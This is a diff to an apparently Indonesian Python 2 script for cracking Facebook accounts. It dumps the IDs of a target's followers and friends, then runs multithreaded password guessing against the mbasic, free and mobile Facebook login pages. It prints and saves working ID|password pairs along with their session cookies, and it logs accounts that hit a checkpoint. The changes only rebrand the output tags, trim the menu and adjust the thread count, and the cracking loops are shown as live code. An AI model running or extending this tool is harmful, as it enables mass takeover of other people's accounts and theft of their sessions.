@@ -286,9 +286,8 @@ def menu():
 	print("\x1b[1;96m[\x1b[1;97m4\x1b[1;96m]\x1b[1;97m Dump ID Follower (dump fast)")
 	print("\x1b[1;96m[\x1b[1;97m5\x1b[1;96m]\x1b[1;97m Dump ID Teman (dump fast)")
 	print("\x1b[1;97m[\x1b[1;92m6\x1b[1;97m]\x1b[1;92m Start Crack (crack fast)")
-	print("\x1b[1;97m[\x1b[1;93m7\x1b[1;97m]\x1b[1;93m Cek Opsi Checkpoint")
-	print("\x1b[1;96m[\x1b[1;97m8\x1b[1;96m]\x1b[1;97m Lihat Hasil Crack")
-	print("\x1b[1;96m[\x1b[1;97m9\x1b[1;96m]\x1b[1;97m Report Bug")
+	print("\x1b[1;96m[\x1b[1;97m7\x1b[1;96m]\x1b[1;97m Lihat Hasil Crack")
+	print("\x1b[1;96m[\x1b[1;97m8\x1b[1;96m]\x1b[1;97m Report Bug")
 	print("\x1b[1;97m[\x1b[1;91m0\x1b[1;97m]\x1b[1;91m Remove Token")
 	daftar_menu()
 def daftar_menu():
@@ -308,8 +307,6 @@ def daftar_menu():
 	elif pilih == "6":
 		metode()
 	elif pilih == "7":
-		cek_opsi()
-	elif pilih == "8":
 		print("\x1b[1;96m[\x1b[1;97m1\x1b[1;96m]\x1b[1;97m Lihat Hasil\x1b[1;92m Ok")
 		print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m]\x1b[1;97m Lihat Hasil\x1b[1;93m Cp")
 		print("\x1b[1;96m[\x1b[1;97m0\x1b[1;96m]\x1b[1;97m Kembali")
@@ -334,7 +331,7 @@ def daftar_menu():
 			menu()
 		else:
 			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-	elif pilih == "9":
+	elif pilih == "8":
 		print("\x1b[1;92m[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Anda Akan Diarahkan Ke Whatsapp")
 		time.sleep(3)
 		os.system("xdg-open https://wa.me/6285220859786?text=Hallo%20Bang%20Ganteng")
@@ -348,9 +345,9 @@ def daftar_menu():
 	else:
 		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
 def metode():
-	print("\n\x1b[1;92m[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Metode mbasic.facebook.com")
-	print("\x1b[1;92m[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Metode free.facebook.com")
-	print("\x1b[1;92m[\x1b[1;97m3\x1b[1;92m]\x1b[1;97m Metode mobile.facebook.com")
+	print("\n\x1b[1;92m[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Metode mbasic")
+	print("\x1b[1;92m[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Metode free facebook")
+	print("\x1b[1;92m[\x1b[1;97m3\x1b[1;92m]\x1b[1;97m Metode mobile facebook")
 	metode=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;92m ")
 	if metode == '':
 		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
@@ -530,7 +527,7 @@ class crack:
 					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
 					continue
 				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
-				ThreadPool(35).map(self.main,self.fl)
+				ThreadPool(30).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
 				break
@@ -551,7 +548,7 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="success":
-					print("\r\x1b[1;92m[Ok] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
+					print("\r\x1b[1;92m[ANGGA_OK] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
 					self.ada.append("%s | %s"%(fl.get("id"),i))
 					if fl.get("id") in open("Live.txt").read():
 						break
@@ -570,7 +567,7 @@ class crack:
 					except (KeyError, IOError):
 		                         bt = "         "
 					except:pass
-					print("\r\x1b[1;93m[Cp] "+(fl.get("id")+"|"+i+" "+bt+" "))
+					print("\r\x1b[1;93m[ANGGA_CP] "+(fl.get("id")+"|"+i+" "+bt+" "))
 					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
 					open("Check.txt","a+").write(
 						"%s|%s %s\n"%(fl.get("id"),i,bt))
@@ -578,7 +575,7 @@ class crack:
 				else:continue
 
 			self.ko+=1
-			print "\r\x1b[1;97m[*] Crack %s/%s Ok:%s - Cp:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			print "\r\x1b[1;97m[•] Crack %s/%s [Ok:%s] - [Cp:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 class crack2:
@@ -650,7 +647,7 @@ class crack2:
 				log=free(fl.get("id"),
 					i,"https://free.facebook.com")
 				if log.get("status")=="success":
-					print("\r\x1b[1;92m[Ok] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
+					print("\r\x1b[1;92m[ANGGA_OK] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
 					self.ada.append("%s | %s"%(fl.get("id"),i))
 					if fl.get("id") in open("Live.txt").read():
 						break
@@ -669,7 +666,7 @@ class crack2:
 					except (KeyError, IOError):
 		                         bt = "         "
 					except:pass
-					print("\r\x1b[1;93m[Cp] "+(fl.get("id")+"|"+i+" "+bt+" "))
+					print("\r\x1b[1;93m[ANGGA_CP] "+(fl.get("id")+"|"+i+" "+bt+" "))
 					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
 					open("Check.txt","a+").write(
 						"%s|%s %s\n"%(fl.get("id"),i,bt))
@@ -677,7 +674,7 @@ class crack2:
 				else:continue
 
 			self.ko+=1
-			print "\r\x1b[1;97m[*] Crack %s/%s Ok:%s - Cp:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			print "\r\x1b[1;97m[•] Crack %s/%s [Ok:%s] - [Cp:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 class crack3:
@@ -728,7 +725,7 @@ class crack3:
 					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
 					continue
 				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
-				ThreadPool(35).map(self.main,self.fl)
+				ThreadPool(30).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
 				break
@@ -749,7 +746,7 @@ class crack3:
 				log=mobile(fl.get("id"),
 					i,"https://m.facebook.com")
 				if log.get("status")=="success":
-					print("\r\x1b[1;92m[Ok] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
+					print("\r\x1b[1;92m[ANGGA_OK] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
 					self.ada.append("%s | %s"%(fl.get("id"),i))
 					if fl.get("id") in open("Live.txt").read():
 						break
@@ -768,7 +765,7 @@ class crack3:
 					except (KeyError, IOError):
 		                         bt = "         "
 					except:pass
-					print("\r\x1b[1;93m[Cp] "+(fl.get("id")+"|"+i+" "+bt+" "))
+					print("\r\x1b[1;93m[ANGGA_CP] "+(fl.get("id")+"|"+i+" "+bt+" "))
 					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
 					open("Check.txt","a+").write(
 						"%s|%s %s\n"%(fl.get("id"),i,bt))
@@ -776,7 +773,7 @@ class crack3:
 				else:continue
 
 			self.ko+=1
-			print "\r\x1b[1;97m[*] Crack %s/%s Ok:%s - Cp:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			print "\r\x1b[1;97m[•] Crack %s/%s [Ok:%s] - [Cp:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 
